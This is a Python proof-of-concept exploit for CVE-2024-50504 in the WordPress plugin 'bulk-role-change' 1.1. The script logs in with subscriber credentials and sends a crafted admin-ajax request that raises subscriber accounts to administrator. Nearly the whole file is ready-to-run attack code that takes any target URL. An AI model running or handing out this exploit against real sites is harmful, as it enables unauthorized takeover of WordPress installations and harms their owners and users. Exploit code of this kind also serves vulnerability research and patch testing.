"""
CVE-2024-50504

Plugin Name: bulk-role-change
Plugin URL: https://wordpress.org/plugins/bulk-role-change/ (CLOSED)
Plugin Version: 1.1

by: ardias
"""
import requests
import argparse

session = requests.Session()

def login(domain, username, password):
    login_url = f'{domain}/wp-login.php'
    session.get(login_url)
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': 1
    }
    r = session.post(login_url, data=data, allow_redirects=False)

    if r.status_code == 302:
        print(f"[+] Login Successful")
        return True

    print(r.text) 
    print(f"[-] Login Failed")
    return False

def change_role(domain):
    url = f"{domain}/wp-admin/admin-ajax.php?action=update_profile"
    header = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    data = {"action":"bulk_change_role","current_role":"subscriber","new_role":"administrator"}
    r = session.post(url, data=data, headers=header)
    if r.status_code == 200:
        print("[+] Your subscriber role has been upgraded to Administrator. Congrats ðŸŽ‰")
    else:
        print("[-] Oops failed...")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Bulk Change Role PoC')
    parser.add_argument('-t', '--target', type=str, help='The target website (e.g., http://example.com)', required=True)
    parser.add_argument('-u', '--username', type=str, help='Subscriber username', required=True)
    parser.add_argument('-p', '--password', type=str, help='Subscriber password', required=True)

    args = parser.parse_args()

    if __name__ == "__main__":
        if login(args.target, args.username, args.password):
            change_role(args.target)